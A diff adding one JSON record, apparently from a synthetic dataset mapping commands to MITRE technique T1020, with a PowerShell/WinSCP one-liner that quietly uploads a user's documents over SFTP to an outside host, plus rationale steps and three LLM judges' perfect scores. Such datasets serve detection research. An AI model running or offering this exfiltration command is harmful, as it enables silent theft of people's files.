@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1020",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$r=\"/keys/\"; & 'C:\\Program Files (x86)\\WinSCP\\WinSCP.com' /ini=nul /command 'option batch on' 'option confirm off' 'open sftp://exfil@198.51.100.60/ -privatekey=\"C:\\ProgramData\\svc\\id_ed25519.ppk\" -hostkey=\"ssh-ed25519 255 SHA256:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=\"' (\"put -preservetime -resume C:\\Users\\Public\\Documents\\* `\"$r`\" -filemask=`\"*.docx;*.xlsx;*.pdf|thumbs.db;|*.tmp`\"\") 'exit' | Out-Null 2>$null",
+  "explanation": "Performs automated SFTP exfiltration using key-based authentication, targeting specific document types and excluding common noise.",
+  "rationale_steps": [
+    "Use private key authentication to avoid password prompts",
+    "Pin server host key to prevent interactive trust prompts",
+    "Filter file types with filemask and upload with resume",
+    "Suppress all console output"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1020-1f3f2541-8ff852cb",
+  "source_prompt_hash": "1f3f2541",
+  "timestamp_utc": "2025-09-30T09:07:17.472275Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "PowerShell command is well-formed with balanced quoting/parentheses, correct use of the invocation operator, valid WinSCP.com switches, properly escaped inner quotes, and valid redirections.",
+        "semantic_score": 5,
+        "semantic_justification": "It automates SFTP exfiltration of selected document types from C:\\Users\\Public\\Documents to a remote path using key-based auth, non-interactive options, file masks, and output suppression, aligning with T1020.",
+        "combined_score": 5.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T02:52:05.003501Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with properly balanced quotes, valid PowerShell syntax, correct WinSCP command-line parameters, and appropriate escape sequences for nested quotes.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with the T1020 Automated Exfiltration technique by using WinSCP to automatically transfer specific document types (*.docx, *.xlsx, *.pdf) via SFTP with private key authentication, while excluding noise files and suppressing output.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T02:52:07.790784Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, using correct Powershell syntax for invoking external commands, variable expansion, and escaping nested quotes for WinSCP arguments.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly achieves the claimed intent of automated SFTP exfiltration, using appropriate tools, arguments, and realistic paths consistent with T1020.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T05:34:15.671636Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 5.0,
+    "llm_average_score": 5.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
